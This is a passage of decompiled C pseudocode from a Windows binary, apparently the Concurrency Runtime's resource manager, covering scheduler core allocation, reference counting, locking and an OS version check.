      v14 = *(_DWORD *)(v13 + 4 * v8);
      if ( !*(_DWORD *)(v14 + 40) )
      {
        --v2;
        *(_DWORD *)(v13 + 4 * v8) = *(_DWORD *)(v13 + 4 * v2);
        *(_DWORD *)(this[23] + 4 * v2) = v14;
      }
    }
    while ( v8 < v2 );
    a2 = v2;
  }
  v15 = 0;
  v43 = 0;
  if ( v2 )
  {
    v44 = this[23];
    do
    {
      v47 = v15;
      v37 = v15 + 1;
      v16 = v15 + 1;
      if ( v15 + 1 < v2 )
      {
        v17 = 4 * v15;
        do
        {
          if ( *(_DWORD *)(*(_DWORD *)(v44 + 4 * v16) + 40) >= *(_DWORD *)(*(_DWORD *)(v17 + v44) + 40) )
          {
            v18 = v47;
          }
          else
          {
            v18 = v16;
            v47 = v16;
            v17 = 4 * v16;
          }
          ++v16;
        }
        while ( v16 < v2 );
        v15 = v43;
        this = i;
        if ( v43 != v18 )
        {
          v19 = i[23];
          v20 = *(_DWORD *)(v19 + 4 * v43);
          *(_DWORD *)(v19 + 4 * v43) = *(_DWORD *)(v19 + 4 * v18);
          *(_DWORD *)(i[23] + 4 * v47) = v20;
        }
      }
      v44 = this[23];
      v21 = *(_DWORD *)(v44 + 4 * v15);
      v22 = *(_DWORD *)(v21 + 16);
      v23 = *(_DWORD *)(v22 + 16);
      v24 = *(_DWORD *)(v22 + 20);
      v48 = v23;
      v25 = 0;
      v40 = 0;
      if ( *(_DWORD *)(v21 + 40) )
      {
        v26 = v24;
        do
        {
          v38 = *(_DWORD *)(v26 + 4 * v25);
          v39 = this[6];
          v27 = v25 + 1;
          v28 = v25 + 1;
          v41 = v25 + 1;
          if ( v25 + 1 < v39 )
          {
            v29 = v48 + 52 * v38;
            v30 = v25;
            v31 = v48;
            do
            {
              v45 = v31 + 52 * *(_DWORD *)(v26 + 4 * v28);
              v32 = *(_DWORD *)(v45 + 28);
              if ( v32 )
              {
                if ( v32 < *(_DWORD *)(v45 + 4) )
                {
                  v33 = *(_DWORD *)(v29 + 28);
                  if ( !v33 || v33 >= *(_DWORD *)(v29 + 4) || *(_DWORD *)(v45 + 28) > v33 )
                  {
                    v29 = v31 + 52 * *(_DWORD *)(v26 + 4 * v28);
                    v30 = v28;
                  }
                }
                v31 = v48;
              }
              ++v28;
            }
            while ( v28 < v39 );
            v34 = v40 == v30;
            v15 = v43;
            v46 = v30;
            this = i;
            if ( !v34 )
            {
              *(_DWORD *)(v26 + 4 * v40) = *(_DWORD *)(v26 + 4 * v46);
              *(_DWORD *)(v26 + 4 * v46) = v38;
            }
            v27 = v41;
          }
          v25 = v27;
          v44 = this[23];
          v40 = v27;
        }
        while ( v27 < *(_DWORD *)(*(_DWORD *)(v44 + 4 * v15) + 40) );
        v2 = a2;
      }
      v15 = v37;
      v43 = v37;
    }
    while ( v37 < v2 );
  }
  return j;
}
// 44DA72: conditional instruction was optimized away because %arg_0.4!=0
// 44DAC2: conditional instruction was optimized away because esi.4!=0

//----- (0044DC6B) --------------------------------------------------------
unsigned int __thiscall sub_44DC6B(_DWORD *this, int a2, unsigned int a3, unsigned int a4, unsigned int a5)
{
  unsigned int v6; // ecx
  int v7; // esi
  unsigned int v8; // edi
  unsigned int v10; // eax
  _DWORD *v11; // ecx
  unsigned int v12; // eax
  unsigned int v13; // ebx
  int v14; // eax
  int v15; // esi
  int v16; // ecx
  double v17; // st7
  _DWORD *v18; // edi
  unsigned int v19; // esi
  double v20; // st6
  double v21; // st7
  unsigned int v22; // ecx
  int v23; // eax
  unsigned int v24; // ecx
  int v25; // eax
  unsigned int v26; // edx
  int v27; // eax
  double v28; // st7
  double v29; // st6
  double v30; // st6
  char v31; // al
  unsigned int v32; // eax
  double v33; // st7
  char v34; // cl
  double v35; // st7
  double v36; // st6
  double v37; // st6
  unsigned int v38; // eax
  _DWORD *v39; // eax
  double v40; // st7
  char v41; // cl
  double v42; // st7
  double v43; // st6
  int v44; // eax
  _DWORD *v45; // edx
  int v46; // ecx
  double v48; // [esp+4h] [ebp-44h]
  double v49; // [esp+Ch] [ebp-3Ch]
  double v50; // [esp+14h] [ebp-34h]
  int v51; // [esp+20h] [ebp-28h]
  unsigned int v52; // [esp+24h] [ebp-24h]
  _DWORD *v53; // [esp+2Ch] [ebp-1Ch]
  unsigned int v54; // [esp+2Ch] [ebp-1Ch]
  int v55; // [esp+2Ch] [ebp-1Ch]
  _DWORD *v56; // [esp+2Ch] [ebp-1Ch]
  unsigned int v57; // [esp+2Ch] [ebp-1Ch]
  unsigned int v58; // [esp+30h] [ebp-18h]
  int v59; // [esp+30h] [ebp-18h]
  unsigned int v60; // [esp+34h] [ebp-14h]
  unsigned int v61; // [esp+34h] [ebp-14h]
  unsigned int v62; // [esp+34h] [ebp-14h]
  int v63; // [esp+34h] [ebp-14h]
  char *Block; // [esp+38h] [ebp-10h]
  _DWORD *Blocka; // [esp+38h] [ebp-10h]
  unsigned int v67; // [esp+40h] [ebp-8h]
  char v68; // [esp+47h] [ebp-1h]
  unsigned int v69; // [esp+58h] [ebp+10h]

  v52 = 0;
  v6 = this[2];
  if ( v6 > 1 )
  {
    v7 = this[21] + 4;
    v67 = a3;
    v8 = 1;
    v60 = v6 - 1;
    do
    {
      v53 = *(_DWORD **)(*(_DWORD *)v7 + 16);
      Block = (char *)v53[46];
      v10 = sub_44D60B(v53);
      v11 = v53;
      v54 = v53[40] - v53[42];
      if ( v54 <= (unsigned int)&Block[v10] )
      {
        v12 = v67;
      }
      else
      {
        ++v8;
        a4 += (unsigned int)&Block[sub_44D60B(v11)];
        v12 = v54 + v67;
        v67 += v54;
      }
      v7 += 4;
      --v60;
    }
    while ( v60 );
    v69 = a4;
    v13 = 1;
    v61 = v8;
    if ( v8 > 1 && v69 <= v12 )
    {
      v14 = unknown_libname_86((unsigned __int64)v8 >> 30 != 0 ? -1 : 4 * v8);
      v15 = v14;
      Blocka = (_DWORD *)v14;
      v16 = *(_DWORD *)this[21];
      *(_DWORD *)v14 = v16;
      *(double *)(v16 + 32) = (double)a5;
      v17 = *(double *)(*(_DWORD *)v14 + 32) + 0.0;
      v50 = v17;
      if ( this[2] > 1u )
      {
        v18 = (_DWORD *)(v14 + 4);
        v19 = 1;
        do
        {
          v55 = *(_DWORD *)(*(_DWORD *)(this[21] + 4 * v19) + 16);
          if ( *(_DWORD *)(v55 + 160) - *(_DWORD *)(v55 + 168) <= *(_DWORD *)(v55 + 184) + sub_44D60B((_DWORD *)v55) )
          {
            v17 = v50;
          }
          else
          {
            *v18++ = v55 + 64;
            v17 = *(double *)(v55 + 96) + v50;
            v50 = v17;
          }
          ++v19;
        }
        while ( v19 < this[2] );
        v15 = (int)Blocka;
        v8 = v61;
        v13 = 1;
      }
      v20 = (double)v67;
      v49 = v20;
      while ( 1 )
      {
        v21 = v20 / v17;
        v22 = 0;
        v48 = v21;
        do
        {
          v23 = *(_DWORD *)(v15 + 4 * v22++);
          *(double *)(v23 + 8) = *(double *)(v23 + 32) * v21;
        }
        while ( v22 < v8 );
        sub_44E764(v15, v8);
        v68 = 0;
        v24 = 1;
        do
        {
          v25 = *(_DWORD *)(*(_DWORD *)(v15 + 4 * v24) + 16);
          v26 = *(_DWORD *)(v25 + 160) - *(_DWORD *)(v25 + 168);
          v27 = *(_DWORD *)(v15 + 4 * v24);
          v15 = (int)Blocka;
          if ( *(_DWORD *)(v27 + 4) <= v26 )
          {
            v17 = v50;
            v31 = v68;
          }
          else
          {
            v28 = (double)v26 / (double)*(unsigned int *)(v27 + 4);
            v29 = *(double *)(v27 + 32);
            v50 = v50 - (1.0 - v28) * v29;
            v30 = v28 * v29;
            v17 = v50;
            *(double *)(v27 + 32) = v30;
            v31 = 1;
            v68 = 1;
          }
          ++v24;
        }
        while ( v24 < v8 );
        v20 = v49;
        if ( !v31 )
        {
          v32 = 0;
          v50 = v17;
          v58 = 0;
          do
          {
            v51 = Blocka[v32];
            v56 = *(_DWORD **)(v51 + 16);
            v62 = *(_DWORD *)(v51 + 4);
            if ( v62 <= sub_44B917(v56) )
            {
              v17 = v50;
              v34 = v68;
            }
            else
            {
              v33 = (double)sub_44B917(v56);
              v34 = 1;
              v35 = v33 / (double)v62;
              v68 = 1;
              v36 = *(double *)(v51 + 32);
              v50 = v50 - (1.0 - v35) * v36;
              v37 = v35 * v36;
              v17 = v50;
              *(double *)(v51 + 32) = v37;
            }
            v32 = v58 + 1;
            v58 = v32;
          }
          while ( v32 < v8 );
          v20 = v49;
          if ( !v34 )
          {
            v38 = 0;
            v50 = v17;
            v57 = 0;
            do
            {
              v63 = Blocka[v38];
              v39 = *(_DWORD **)(v63 + 16);
              v59 = v39[46];
              if ( v59 + sub_44D60B(v39) <= *(_DWORD *)(v63 + 4) )
              {
                v17 = v50;
                v41 = v68;
              }
              else
              {
                v40 = (double)(v59 + sub_44D60B(*(_DWORD **)(v63 + 16)));
                v41 = 1;
                v42 = v40 / v48;
                v68 = 1;
                v50 = v42 - *(double *)(v63 + 32) + v50;
                v43 = v42;
                v17 = v50;
                *(double *)(v63 + 32) = v43;
              }
              v38 = v57 + 1;
              v57 = v38;
            }
            while ( v38 < v8 );
            v20 = v49;
            if ( !v41 )
              break;
          }
        }
      }
      if ( *(_DWORD *)(*Blocka + 4) > a3 )
      {
        do
        {
          v44 = Blocka[v13];
          v45 = *(_DWORD **)(v44 + 16);
          v46 = v45[40] - *(_DWORD *)(v44 + 4) - v45[42];
          if ( v46 )
            sub_44E164(this, a2, v45, v46);
          ++v13;
        }
        while ( v13 < v8 );
        v52 = sub_44E444(this, a2, *(_DWORD *)(*Blocka + 4) - a3, 0);
      }
      j_j__free(Blocka);
    }
  }
  return v52;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (0044E016) --------------------------------------------------------
signed __int32 __thiscall sub_44E016(volatile signed __int32 *this)
{
  return _InterlockedIncrement(this + 1);
}

//----- (0044E020) --------------------------------------------------------
char *__thiscall sub_44E020(void *this, int a2, int a3)
{
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  if ( !a2 )
  {
    sub_42E473(pExceptionObject, (int)"pScheduler");
LABEL_6:
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( a3 != 0x10000 )
  {
    sub_42E473(pExceptionObject, (int)"version");
    goto LABEL_6;
  }
  return sub_44B7BE(this, a2);
}

//----- (0044E064) --------------------------------------------------------
signed __int32 __thiscall sub_44E064(int this)
{
  signed __int32 v2; // ebx

  v2 = _InterlockedDecrement((volatile signed __int32 *)(this + 4));
  if ( !v2 )
  {
    sub_44AE22(&dword_500068);
    dword_500000 = sub_44AB76(dword_500000) != this ? dword_500000 : 0;
    dword_500068 = 0;
    if ( *(_DWORD *)(this + 76) )
    {
      sub_44A1E8((LPCRITICAL_SECTION)(this + 44));
      *(_DWORD *)(this + 40) = 2;
      sub_44A32E((LPCRITICAL_SECTION)(this + 44));
      SetEvent(*(HANDLE *)(this + 80));
      sub_44AB21(*(HANDLE *)(this + 76), 0xFFFFFFFF);
    }
    sub_44B02E((char *)this);
    sub_44775B((void *)this);
  }
  return v2;
}
// 500000: using guessed type int dword_500000;
// 500068: using guessed type int dword_500068;

//----- (0044E10F) --------------------------------------------------------
unsigned int __thiscall sub_44E10F(_DWORD *this, int a2, unsigned int a3, int a4)
{
  unsigned int v5; // edi
  int v6; // ebx
  bool v7; // zf

  v5 = 1;
  v6 = 0;
  if ( this[2] > 1u )
  {
    do
    {
      if ( sub_44E164(this, a2, *(_DWORD **)(*(_DWORD *)(this[21] + 4 * v5) + 16), a4) )
        LOBYTE(v6) = 1;
      ++v5;
    }
    while ( v5 < this[2] );
    v7 = (_BYTE)v6 == 0;
    v6 = 0;
    if ( !v7 )
      return sub_44E444(this, a2, a3, 0);
  }
  return v6;
}

//----- (0044E164) --------------------------------------------------------
char __thiscall sub_44E164(_DWORD *this, int a2, _DWORD *a3, int a4)
{
  int v4; // edx
  int v5; // eax
  unsigned int v6; // eax
  int v7; // ebx
  int v8; // edi
  unsigned int v9; // eax
  _DWORD *v10; // ecx
  unsigned int v11; // eax
  int v12; // edi
  int v14; // [esp+Ch] [ebp-18h]
  int v15; // [esp+10h] [ebp-14h]
  _DWORD *v16; // [esp+14h] [ebp-10h]
  unsigned int v17; // [esp+18h] [ebp-Ch]
  int v18; // [esp+1Ch] [ebp-8h]
  int v19; // [esp+20h] [ebp-4h]

  v4 = a4;
  v16 = this;
  if ( a4 == -2 )
  {
    v5 = a3[42];
    v4 = v5;
  }
  else
  {
    if ( a4 == -1 )
    {
      v6 = sub_44D60B(a3);
      this = v16;
      v4 = a3[40] - a3[27] - (a3[46] + v6);
    }
    v5 = 0;
  }
  v7 = v4 - v5;
  if ( !v4 )
    return 0;
  v8 = a3[4];
  v14 = v8;
  v15 = *(_DWORD *)(a2 + 20);
  v9 = 0;
  v17 = 0;
  if ( !this[6] )
    return 0;
  while ( 1 )
  {
    v10 = (_DWORD *)(v8 + 52 * *(_DWORD *)(v15 + 4 * v9));
    if ( v10[7] != v10[9] )
    {
      v11 = 0;
      v18 = 0;
      if ( v10[1] )
        break;
    }
LABEL_21:
    v9 = v17 + 1;
    v17 = v9;
    if ( v9 >= v16[6] )
      return 0;
  }
  v19 = 0;
  while ( 1 )
  {
    v12 = v19 + v10[12];
    if ( *(_DWORD *)v12 != 4 || *(_DWORD *)(v12 + 40) || !*(_BYTE *)(v12 + 49) && !v7 )
      goto LABEL_19;
    *(_DWORD *)v12 = 5;
    ++a3[27];
    --**(_DWORD **)(v12 + 20);
    if ( !*(_BYTE *)(v12 + 49) )
      --v7;
    if ( !--v4 )
      return 1;
    v11 = v18;
LABEL_19:
    v19 += 52;
    v18 = ++v11;
    if ( v11 >= v10[1] )
    {
      v8 = v14;
      goto LABEL_21;
    }
  }
}

//----- (0044E24E) --------------------------------------------------------
int __thiscall sub_44E24E(_DWORD *this, int a2)
{
  int result; // eax

  --*this;
  *(_DWORD *)(*(_DWORD *)(a2 + 24) + 28) = *(_DWORD *)(a2 + 28);
  *(_DWORD *)(*(_DWORD *)(a2 + 28) + 24) = *(_DWORD *)(a2 + 24);
  result = this[1];
  if ( a2 == result )
  {
    if ( result == *(_DWORD *)(result + 24) )
      result = 0;
    else
      result = *(_DWORD *)(result + 28);
    this[1] = result;
  }
  return result;
}

//----- (0044E284) --------------------------------------------------------
void __thiscall sub_44E284(int this, DWORD_PTR *Block)
{
  struct _RTL_CRITICAL_SECTION *v3; // esi
  _DWORD *v4; // edi
  bool v5; // [esp+14h] [ebp-10h]

  v5 = 0;
  v3 = (struct _RTL_CRITICAL_SECTION *)(this + 44);
  sub_44A1E8((LPCRITICAL_SECTION)(this + 44));
  v4 = (_DWORD *)Block[5];
  sub_454B2C(Block);
  if ( v4[40] < sub_44B917(v4) && *(_DWORD *)(this + 8) == 1 )
    v5 = !sub_44BCEA((_DWORD *)this);
  sub_44A32E(v3);
  if ( v5 )
    SetEvent(*(HANDLE *)(this + 80));
}

//----- (0044E2FB) --------------------------------------------------------
_DWORD *__thiscall sub_44E2FB(int this, _DWORD *a2, char a3)
{
  struct _RTL_CRITICAL_SECTION *v4; // esi
  _DWORD *v5; // eax
  char v6; // bl
  bool v8; // [esp+14h] [ebp-14h]
  _DWORD *v9; // [esp+18h] [ebp-10h]

  v4 = (struct _RTL_CRITICAL_SECTION *)(this + 44);
  v9 = 0;
  v8 = 0;
  sub_44A1E8((LPCRITICAL_SECTION)(this + 44));
  if ( a3 )
  {
    v9 = sub_4560FA(a2);
    v8 = v9 == 0;
  }
  if ( a2[33] == a2[32] )
    ++*(_DWORD *)(this + 16);
  ++*(_DWORD *)(this + 8);
  sub_44B1F3((_DWORD *)(this + 96), (int)a2);
  v5 = sub_44D624((unsigned int *)this, a2, 1, v8);
  if ( !v9 )
    v9 = v5;
  if ( a2[33] == a2[32] )
    sub_44E93B((_DWORD *)this, a2);
  if ( *(_DWORD *)(this + 8) == 2 )
  {
    v6 = 0;
    *(_DWORD *)(this + 40) = 1;
    if ( !*(_DWORD *)(this + 76) )
    {
      *(_DWORD *)(this + 76) = 1;
      *(_DWORD *)(this + 88) = unknown_libname_86(
                                 (unsigned __int64)*(unsigned int *)(this + 12) >> 30 != 0
                               ? -1
                               : 4 * *(_DWORD *)(this + 12));
      *(_DWORD *)(this + 92) = unknown_libname_86(
                                 (unsigned __int64)*(unsigned int *)(this + 12) >> 30 != 0
                               ? -1
                               : 4 * *(_DWORD *)(this + 12));
      v6 = 1;
    }
    sub_44A32E(v4);
    SetEvent(*(HANDLE *)(this + 80));
    if ( v6 )
      sub_44B757((LPVOID)this);
  }
  else
  {
    sub_44A32E(v4);
  }
  return v9;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (0044E410) --------------------------------------------------------
unsigned int __thiscall sub_44E410(_DWORD *this, int a2, unsigned int a3)
{
  int v3; // edi
  unsigned int i; // esi
  unsigned int v5; // eax
  _DWORD *v7; // [esp+8h] [ebp-4h]

  v3 = 0;
  v7 = this;
  for ( i = 0; i < a3; i += v5 )
  {
    v5 = sub_44E444(this, a2, a3 - i, ++v3);
    this = v7;
  }
  return i;
}

//----- (0044E444) --------------------------------------------------------
unsigned int __thiscall sub_44E444(_DWORD *this, int a2, unsigned int a3, int a4)
{
  char v5; // al
  int v6; // esi
  unsigned int v7; // ebx
  unsigned int v8; // edx
  _DWORD *v9; // ecx
  unsigned int v10; // edi
  int v11; // esi
  int v12; // edx
  int v13; // ecx
  unsigned int v14; // edi
  _DWORD *v15; // eax
  unsigned int v16; // ecx
  _DWORD *v17; // edx
  unsigned int v18; // ebx
  unsigned int v19; // esi
  _DWORD *v20; // ecx
  unsigned int v21; // eax
  unsigned int v22; // ecx
  int v23; // edx
  int v24; // eax
  unsigned int v25; // edi
  int v26; // ebx
  int v27; // eax
  int v28; // ecx
  unsigned int v30; // [esp+Ch] [ebp-24h]
  unsigned int v31; // [esp+10h] [ebp-20h]
  int v32; // [esp+10h] [ebp-20h]
  int v33; // [esp+14h] [ebp-1Ch]
  int v35; // [esp+1Ch] [ebp-14h]
  int v36; // [esp+20h] [ebp-10h]
  unsigned int v37; // [esp+24h] [ebp-Ch]
  unsigned int v38; // [esp+28h] [ebp-8h]
  char v39; // [esp+2Fh] [ebp-1h]

  v33 = -1;
  if ( *(_BYTE *)(a2 + 104) )
    v33 = sub_44CCAC(this, 0);
  v5 = 0;
  v6 = *(_DWORD *)(a2 + 20);
  v7 = 0;
  v8 = this[6];
  v36 = *(_DWORD *)(a2 + 16);
  v35 = v6;
  v39 = 0;
  v31 = 0;
  if ( v8 )
  {
    v9 = (_DWORD *)(*(_DWORD *)(a2 + 16) + 8);
    do
    {
      v10 = 0;
      if ( *(v9 - 1) )
      {
        v11 = 0;
        do
        {
          v12 = v9[10];
          if ( *(_DWORD *)(v12 + v11) == 1 )
          {
            if ( a4 == **(_DWORD **)(v12 + v11 + 20) )
            {
              v5 = 1;
              *(_DWORD *)(v12 + v11) = 2;
              ++*v9;
              v39 = 1;
            }
            else
            {
              v5 = v39;
            }
          }
          ++v10;
          v11 += 52;
        }
        while ( v10 < *(v9 - 1) );
        v7 = v31;
      }
      ++v7;
      v9 += 13;
      v31 = v7;
      v8 = this[6];
    }
    while ( v7 < v8 );
    v6 = v35;
  }
  v13 = 0;
  v37 = 0;
  if ( v5 )
  {
    v14 = 0;
    v32 = 0;
    if ( v8 )
    {
      v15 = this;
      do
      {
        v16 = v14;
        v38 = v14;
        v17 = (_DWORD *)(v36 + 52 * *(_DWORD *)(v6 + 4 * v14));
        v18 = a3 - v37;
        if ( a3 != v37 )
        {
          if ( v17[2] > v18 )
            v17[2] = v18;
          v19 = v14 + 1;
          if ( v14 + 1 < v15[6] )
          {
            while ( 1 )
            {
              v20 = (_DWORD *)(v36 + 52 * *(_DWORD *)(v35 + 4 * v19));
              v30 = v20[2];
              if ( v30 > v18 )
              {
                v20[2] = v18;
                v30 = a3 - v37;
              }
              v21 = v30 + v20[6] + v20[7];
              v22 = v17[2] + v17[6] + v17[7];
              if ( v22 >= v21 )
              {
                if ( v22 != v21 || !*(_BYTE *)(a2 + 104) || (v24 = *(_DWORD *)(v35 + 4 * v19), v24 != v33) )
                {
                  v16 = v38;
                  goto LABEL_32;
                }
                v23 = 52 * v24;
              }
              else
              {
                v23 = 52 * *(_DWORD *)(v35 + 4 * v19);
              }
              v17 = (_DWORD *)(v36 + v23);
              v16 = v19;
              v38 = v19;
LABEL_32:
              if ( ++v19 >= this[6] )
              {
                v14 = v32;
                break;
              }
            }
          }
          v6 = v35;
        }
        if ( v17[2] )
        {
          if ( v17[1] )
          {
            v25 = 0;
            v26 = 0;
            do
            {
              v27 = v26 + v17[12];
              if ( *(_DWORD *)v27 == 2 )
              {
                v16 = v38;
                if ( v37 >= a3 )
                {
                  *(_DWORD *)v27 = 1;
                }
                else
                {
                  *(_DWORD *)v27 = 3;
                  ++**(_DWORD **)(v27 + 20);
                  ++v17[6];
                  if ( *(_BYTE *)(a2 + 104) && *(_DWORD *)(v6 + 4 * v38) == v33 )
                    *(_BYTE *)(a2 + 104) = 0;
                  ++v37;
                }
              }
              ++v25;
              v26 += 52;
            }
            while ( v25 < v17[1] );
            v14 = v32;
          }
          v17[2] = 0;
        }
        if ( v14 != v16 )
        {
          v28 = *(_DWORD *)(v6 + 4 * v14);
          *(_DWORD *)(v6 + 4 * v14) = *(_DWORD *)(v6 + 4 * v38);
          *(_DWORD *)(v6 + 4 * v38) = v28;
        }
        v15 = this;
        v32 = ++v14;
      }
      while ( v14 < this[6] );
      return v37;
    }
  }
  return v13;
}

//----- (0044E61F) --------------------------------------------------------
int __thiscall sub_44E61F(_DWORD *this)
{
  _DWORD *v1; // esi
  __int64 v2; // rax
  int v3; // edi
  _DWORD *v4; // ecx
  int v5; // ebx
  unsigned int v6; // esi
  _DWORD *v7; // eax

  v1 = this;
  v2 = 0i64;
  if ( this[6] )
  {
    v3 = 0;
    do
    {
      v4 = (_DWORD *)(v3 + v1[18]);
      v4[2] = 0;
      v4[7] = 0;
      if ( v4[1] )
      {
        v5 = 0;
        v6 = 0;
        do
        {
          v7 = (_DWORD *)(v5 + v4[8]);
          v5 += 36;
          *v7 = 0;
          v7[7] = 0;
          ++v6;
        }
        while ( v6 < v4[1] );
        v1 = this;
        LODWORD(v2) = 0;
      }
      ++HIDWORD(v2);
      v3 += 40;
    }
    while ( HIDWORD(v2) < v1[6] );
  }
  return v2;
}

//----- (0044E676) --------------------------------------------------------
__int32 sub_44E676()
{
  __int32 result; // eax
  char pExceptionObject[12]; // [esp+0h] [ebp-124h] BYREF
  struct _OSVERSIONINFOW VersionInformation; // [esp+Ch] [ebp-118h] BYREF

  VersionInformation.dwOSVersionInfoSize = 276;
  if ( !GetVersionExW(&VersionInformation) )
  {
LABEL_20:
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVunsupported_os_Concurrency__);
  }
  if ( VersionInformation.dwMajorVersion != 5 )
  {
    if ( VersionInformation.dwMajorVersion != 6 )
      goto LABEL_9;
    result = VersionInformation.dwMinorVersion;
    if ( !VersionInformation.dwMinorVersion )
    {
      dword_500024 = 3;
      return result;
    }
    if ( VersionInformation.dwMinorVersion == 1 )
      dword_500024 = 4;
    else
LABEL_9:
      dword_500024 = 6;
    goto LABEL_17;
  }
  if ( !VersionInformation.dwMinorVersion )
  {
    dword_500024 = 0;
    goto LABEL_20;
  }
  if ( VersionInformation.dwMinorVersion == 1 )
  {
    result = 1;
    dword_500024 = 1;
  }
  else
  {
    result = VersionInformation.dwMinorVersion - 2;
    if ( VersionInformation.dwMinorVersion == 2 )
    {
      dword_500024 = 2;
      return result;
    }
    result = dword_500024;
  }
  if ( result >= 4 )
  {
LABEL_17:
    result = sub_44A5CE();
    if ( dword_500024 >= 6 )
      return sub_45646E();
  }
  return result;
}
// 500024: using guessed type int dword_500024;

//----- (0044E764) --------------------------------------------------------
void __cdecl sub_44E764(int a1, unsigned int a2)
{
  unsigned int v2; // edx
  double v3; // st6
  double v4; // st5
  unsigned int v5; // esi
  int v6; // ecx
  unsigned int v7; // esi
  unsigned int v8; // eax
  unsigned int v9; // edx
  int v10; // esi
  unsigned int v11; // eax
  int v12; // ecx
  unsigned int v13; // ecx
  unsigned int v14; // esi
  double v15; // st4
  double v16; // rt0
  double v17; // rt1
  double v18; // st4
  double v19; // st6
  double v20; // rt2
  double v21; // st4
  double v22; // st5
  double v23; // rtt
  double v24; // st3
  unsigned int v25; // eax
  unsigned int v26; // esi
  int v27; // edx
  unsigned int v28; // eax
  double v29; // rt2
  int v30; // eax
  double v31; // rtt
  double v32; // st4
  double v33; // rt0
  int v34; // ecx
  unsigned int v35; // [esp+Ch] [ebp-14h]
  unsigned int v36; // [esp+14h] [ebp-Ch]
  unsigned int v37; // [esp+14h] [ebp-Ch]
  unsigned int v38; // [esp+18h] [ebp-8h]
  unsigned int v39; // [esp+1Ch] [ebp-4h]
  unsigned int v40; // [esp+1Ch] [ebp-4h]
  unsigned int v41; // [esp+1Ch] [ebp-4h]

  v2 = 0;
  v3 = 0.0;
  v4 = 0.0000001;
  v35 = 0;
  v5 = 0;
  v39 = 0;
  if ( a2 )
  {
    do
    {
      *(_DWORD *)(*(_DWORD *)(a1 + 4 * v5) + 4) = (unsigned __int64)*(double *)(*(_DWORD *)(a1 + 4 * v5) + 8);
      v6 = *(_DWORD *)(a1 + 4 * v39);
      v5 = v39 + 1;
      v39 = v5;
      *(double *)(v6 + 8) = *(double *)(v6 + 8) - (double)*(unsigned int *)(v6 + 4);
    }
    while ( v5 < a2 );
    v7 = 0;
    v36 = 0;
    do
    {
      v8 = v7 + 1;
      v40 = v7;
      v38 = v7 + 1;
      v9 = v7 + 1;
      if ( v7 + 1 < a2 )
      {
        v10 = 4 * v7;
        do
        {
          if ( *(double *)(*(_DWORD *)(v10 + a1) + 8) + 0.0000001 >= *(double *)(*(_DWORD *)(a1 + 4 * v9) + 8) )
          {
            v11 = v40;
          }
          else
          {
            v11 = v9;
            v40 = v9;
            v10 = 4 * v9;
          }
          ++v9;
        }
        while ( v9 < a2 );
        if ( v36 != v11 )
        {
          v12 = *(_DWORD *)(a1 + 4 * v36);
          *(_DWORD *)(a1 + 4 * v36) = *(_DWORD *)(a1 + 4 * v11);
          *(_DWORD *)(a1 + 4 * v40) = v12;
        }
        v8 = v38;
      }
      v7 = v8;
      v36 = v8;
    }
    while ( v8 < a2 );
    v2 = 0;
  }
  v13 = a2 - 1;
  v14 = 0;
  if ( a2 )
  {
    v15 = 1.0;
    while ( 1 )
    {
      v17 = v15;
      v18 = v3;
      v19 = v17;
      while ( v18 > v4 )
      {
        v20 = v18;
        v21 = v4;
        v22 = v20;
        if ( v21 < *(double *)(*(_DWORD *)(a1 + 4 * v13) + 8) )
        {
          while ( 1 )
          {
            v30 = *(_DWORD *)(a1 + 4 * v13);
            v31 = v21;
            v32 = v22;
            v4 = v31;
            --v13;
            v33 = v32 - *(double *)(v30 + 8);
            *(double *)(v30 + 8) = 0.0;
            v18 = v33;
            if ( v33 <= v31 )
              break;
            v29 = v18;
            v21 = v4;
            v22 = v29;
          }
        }
        else
        {
          --v13;
          v23 = v21;
          v18 = v22;
          v4 = v23;
        }
      }
      if ( v14 > v13 )
        break;
      v24 = *(double *)(*(_DWORD *)(a1 + 4 * v14) + 8);
      if ( v24 > v4 )
      {
        *(double *)(*(_DWORD *)(a1 + 4 * v14) + 8) = 0.0;
        v18 = v18 + v19 - v24;
        ++*(_DWORD *)(*(_DWORD *)(a1 + 4 * v14) + 4);
      }
      if ( ++v14 >= a2 )
        break;
      v16 = v18;
      v15 = v19;
      v3 = v16;
    }
  }
  if ( a2 )
  {
    do
    {
      v25 = v2 + 1;
      v41 = v2;
      v37 = v2 + 1;
      v26 = v2 + 1;
      if ( v2 + 1 < a2 )
      {
        v27 = 4 * v2;
        do
        {
          if ( **(_DWORD **)(a1 + 4 * v26) >= **(_DWORD **)(v27 + a1) )
          {
            v28 = v41;
          }
          else
          {
            v28 = v26;
            v41 = v26;
            v27 = 4 * v26;
          }
          ++v26;
        }
        while ( v26 < a2 );
        if ( v35 != v28 )
        {
          v34 = *(_DWORD *)(a1 + 4 * v35);
          *(_DWORD *)(a1 + 4 * v35) = *(_DWORD *)(a1 + 4 * v28);
          *(_DWORD *)(a1 + 4 * v41) = v34;
        }
        v25 = v37;
      }
      v2 = v25;
      v35 = v25;
    }
    while ( v25 < a2 );
  }
}

//----- (0044E91C) --------------------------------------------------------
char __thiscall sub_44E91C(volatile signed __int32 *this)
{
  volatile signed __int32 *v1; // esi
  signed __int32 v2; // edx

  v1 = this + 1;
  while ( *v1 )
  {
    v2 = *v1;
    if ( _InterlockedCompareExchange(v1, v2 + 1, v2) == v2 )
      return 1;
  }
  return 0;
}

//----- (0044E93B) --------------------------------------------------------
void __thiscall sub_44E93B(_DWORD *this, _DWORD *a2)
{
  unsigned int v3; // ecx
  int v4; // edx
  int v5; // ebx
  int v6; // eax
  int v7; // edi
  unsigned int v8; // ecx
  int v9; // edx
  int v10; // eax
  int v11; // eax
  int v12; // edi
  _DWORD *v13; // ecx
  int v14; // eax
  unsigned int v15; // ecx
  int v16; // edi
  int v17; // ebx
  unsigned int v18; // edx
  int v19; // eax
  int v20; // ecx
  int v21; // eax
  int v22; // edi
  _DWORD *v23; // edi
  _DWORD *v24; // ecx
  bool v25; // zf
  unsigned int v26; // [esp+4h] [ebp-20h]
  int v27; // [esp+8h] [ebp-1Ch]
  int v28; // [esp+Ch] [ebp-18h]
  unsigned int v29; // [esp+Ch] [ebp-18h]
